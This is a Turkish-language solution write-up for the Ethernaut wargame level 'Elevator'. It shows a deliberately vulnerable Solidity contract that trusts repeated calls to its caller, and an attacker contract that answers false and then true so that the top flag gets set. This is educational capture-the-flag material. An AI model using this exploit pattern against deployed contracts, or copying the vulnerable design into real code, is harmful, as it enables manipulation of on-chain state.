# ETHERNAUT SORU 11: Elevator

> This elevator won't let you reach the top of your building. Right?
>
>##### Things that might help:
>
>-   Sometimes solidity is not good at keeping promises.
>-   This `Elevator` expects to be used from a `Building`.



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

Bu soruda çağırıldığına onu çağıran adresteki bir fonksiyonu çağırmak isteyen bir kontrakt görüyoruz. Bu fonksiyon kendisine verilen `floor` sayısına `boolean` bir cevap vermelidir. İlk cevabı negatif, 2. cevabı ise pozitif olacaktır. 

Bizim amacımız ise bu şartları sağlayan bir fonksiyon yazıp `top` değişkenine pozitif değeri verdirtmek. Bunun için şöyle bir kontrakt yazabiliriz.

```solidity
// SPDX-License-Identifier: MIT
pragma  solidity  ^0.8.0;
import  "chall.sol";

contract Solution is Building{
bool ilk_mi=true;
Elevator elev;
function isLastFloor(uint256)  external  returns  (bool){
if  (ilk_mi){
	ilk_mi=false;
	return  false;
	}

return  true;
}

function basla(address victim)  public{
elev = Elevator(victim);
elev.goTo(5);
  
	}
}
```
Bu kod basla fonksiyonu çağırıldığında hedef kontraktın `goTo` fonksiyonunu 5 değerini vererek çalıştırıyor(istediğimiz değeri verebiliriz fark etmez). Böylelikle o hedef kontrakt bizim `isLastFloor` fonksiyonumuzu çağırmış oluyor. Bu fonksiyon ilk çağırıldığında olumsuz yanıt verirken 2. de ise olumlu yanıt veriyor. Böylelikle soru çözülmüş oluyor.
